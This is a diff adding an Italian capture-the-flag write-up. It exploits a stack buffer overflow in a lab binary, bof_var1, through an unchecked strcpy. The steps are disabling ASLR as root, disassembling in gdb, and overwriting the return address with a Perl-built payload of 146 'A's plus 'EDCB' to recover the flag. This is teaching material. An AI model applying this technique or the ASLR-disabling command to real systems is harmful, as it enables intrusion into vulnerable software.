@@ -1,0 +1,32 @@
+Al fine di disabilitare la randomizzazione dello spazio di indirizzamento si esegue, da root, il comando:
+echo 0 > /proc/sys/kernel/randomize_va_space
+
+Si concedono i permessi di esecuzione con il comando:
+chmod +x bof_var1
+
+Si comincia, dunque, a ispezionare il binario invocando:
+gdb bof_var1
+
+Si indica il set di istruzioni utilizzato
+(gdb) set disassembly-flavor intel
+
+Al fine di far assegnare gli indirizzi in memoria, si esegue a vuoto il programma una prima volta:
+(gdb) run
+
+Si ispeziona allora la funzione main con:
+(gdb) disas main
+
+Si osserva come vi sia uun'invocazione a un funzione vuln; si esegue, allora:
+(gdb) disas vuln
+
+Internamente a vuln, si osserva come vi sia un'invocazione a una funzione strcpy, funzione notoriamente vulnerabile in quanto non controlla la dimensione del buffer.
+Procedendo per tentativi si scopre come invocando un run con un input generato dal piccolo script perl riportato si sia capaci di controllare l'indirizzo di ritorno:
+(gdb) run $(perl -e 'print "A"x146,"BBBB"')
+Infatti il programma giunge in segmentation fault dopo aver provato ad accedere all'indirizzo 0x42424242, con 0x42 codifica esadecimale del carattere "B"
+Dall'output stampato dal programma precedentemente al segmentation fault si evince di dover impostare l'indirizzo di ritorno a 0x42434445.
+Pertanto, conoscendo le codifiche dei caratteri "C", "D", "E", il payload finale dovrà consistere in 146 "A" seguite da "EDCB", in quanto si ricorda che quella Intel è un'architettura little endian.
+Si esegue
+(gdb) run $(perl -e 'print "A"x146,"EDCB"')
+rinvenendo dunque la flag:
+SEC{thisistherightflagidiot!}
+
